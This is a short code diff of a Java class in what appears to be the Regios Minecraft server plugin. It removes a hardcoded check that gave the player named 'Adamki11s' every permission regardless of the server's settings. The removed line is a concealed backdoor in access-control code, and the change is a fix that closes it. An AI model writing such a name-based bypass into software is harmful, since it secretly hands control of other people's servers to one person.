@@ -15,12 +15,13 @@ public class PermissionsCore {
     public static boolean hasPermissions = false, iConomyEnabled = false;
     
     public static boolean doesHaveNode(Player p, String node){
-    	return (hasPermissions ? (permissionHandler.has(p, node) || p.isOp() || p.getName().equals("Adamki11s")) : (p.isOp()  || p.getName().equals("Adamki11s")));
+    	return (hasPermissions ? (permissionHandler.has(p, node) || p.isOp()) : (p.isOp()));
     }
     
     public static void sendInvalidPerms(Player p){
     	p.sendMessage(ChatColor.RED + "[Regios] You do not have permissions to do this!");
     }
+    
     
     public static void sendInvalidPermsPopup(SpoutPlayer p){
     	p.sendNotification("Permissions", ChatColor.RED + "You cannot do this!", Material.FIRE);
